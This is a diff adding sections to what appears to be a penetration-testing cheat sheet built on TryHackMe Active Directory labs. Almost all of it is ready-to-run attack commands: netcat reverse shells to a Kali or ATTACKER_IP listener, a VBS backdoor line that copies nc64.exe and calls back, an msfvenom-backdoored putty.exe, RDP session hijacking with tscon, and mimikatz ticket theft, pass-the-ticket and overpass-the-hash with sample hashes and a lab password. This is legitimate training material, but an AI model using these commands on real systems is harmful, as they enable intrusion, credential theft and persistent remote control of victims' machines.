@@ -117,6 +117,47 @@ To SSH into a user using a private key:
 ```
 ssh -i <private_key> <username>@<target_ip>
 ```
+#### <span style="color:rgb(11, 142, 224)">To connect to RDP : </span>
+
+BLACK SCREEN : lower mtu to 1000
+```
+xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
+```
+or
+When it isn't connecting : 
+```
+xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /sec:rdp
+```
+or 
+```
+xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
+```
+Enter the password when prompted.
+
+Transfer `nc.exe` to windows and get a reverse shell : 
+Download 64 bit netcat : 
+if required then download 32 bit x86 netcat
+```
+https://github.com/int0x33/nc.exe/
+```
+start python server : 
+```
+python3 -m http.server 8000
+```
+download on windows :
+```
+powershell iwr http://<kali ip>:8000/nc.exe -o nc.exe
+```
+to get shell back from windows to kali : 
+start a listener on Kali:
+```
+rlwrap -f . nc -lvnp 4444
+```
+windows command to get reverse shell of cmd : 
+```
+nc.exe -e cmd.exe <kali ip> 4444
+```
+
 #### <span style="color:rgb(11, 142, 224)">Stable Shell : </span>
 
 And we have a shell as www / $ , Get a tty (stable shell) shell using, 
@@ -3435,4 +3476,148 @@ winrs.exe -r:THMIIS.za.tryhackme.com cmd
 now we get the access of the user we used the NTLM hash of
 
 #### ==🔵Abusing User Behavior==
+
+##### Abusing Writable Shares
+
+if an attacker can modify a file stored on a shared network folder, they may be able to trick another user into running malicious code when that user opens the file.
+###### Backdooring .vbs Scripts
+
+As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:
+
+```shell-session
+CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
+```
+
+This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.
+###### Backdooring .exe Files
+
+If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:
+
+```shell-session
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+```
+
+The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit.
+##### RDP hijacking
+
+Rdp first into an admin user 
+```
+xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eileen.hall /p:Higgins1980 /cert:ignore /dynamic-resolution
+```
+
+open admin command prompt 
+
+if we currently are admin only , we need to get to system 
+```
+C:\tools>whoami
+za\t2_eileen.hall
+```
+now we try `PsExec64.exe`
+```
+PsExec64.exe -s cmd.exe
+```
+click on agree
+we get system shell
+
+
+To list the existing sessions on a server, you can use the following command:
+```
+query user
+```
+To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME.
+```
+tscon 2 /dest:rdp-tcp#89
+#tscon <ID of the user name of which we want to hijack rdp session of> /dest:<Current SESSIONNAME>
+```
+now we get the rdp session of another user
+#### ==🔵Pass The Ticket
+
+extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:
+```
+.\mimikatz.exe  
+```
+
+```shell-session
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
+
+see what all tickets we've got 
+```
+exit 
+dir
+```
+
+Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:
+now copy the full ticket name as paste : 
+it should be `@krbtgt`
+```shell-session
+mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+```
+
+for ex to open a cmd of another another computer 
+The `-r` option specifies the remote computer name, not the username.
+```
+winrs.exe -r:THMIIS.za.tryhackme.com cmd
+```
+
+you can use to see what all tickets are injected into the memory : 
+```
+klist 
+```
+
+#### ==🔵Overpass-the-hash / Pass-the-Key
+
+uses a user's password-derived cryptographic key instead of knowing the actual password.
+This kind of attack is similar to Pass-the-hash but applied to Kerberos networks.
+
+```
+.\mimikatz
+```
+
+We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:
+```shell-session
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+```
+
+Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key (`nc64` is already available in THMJMP2 for your convenience):
+
+**If we have the RC4 hash:**
+```shell-session
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+
+**If we have the AES128 hash:**
+```shell-session
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+
+**If we have the AES256 hash:**
+```shell-session
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+```
+
+To receive the reverse shell, we should run a reverse listener on our AttackBox:
+```shell-session
+user@AttackBox$ nc -lvp 5556
+```
+
+Just as with PtH, any command run from this shell will use the credentials injected via mimikatz.
+
+### ==🟢Exploitation
+
+#### Exploiting Kerberos Permission Delegation
+
+
+
+
+
+#### Exploiting Automated Relays
+
+#### Exploiting AD Users
+
+#### Exploiting Group Policy Objects (GPOs)
+
+
 
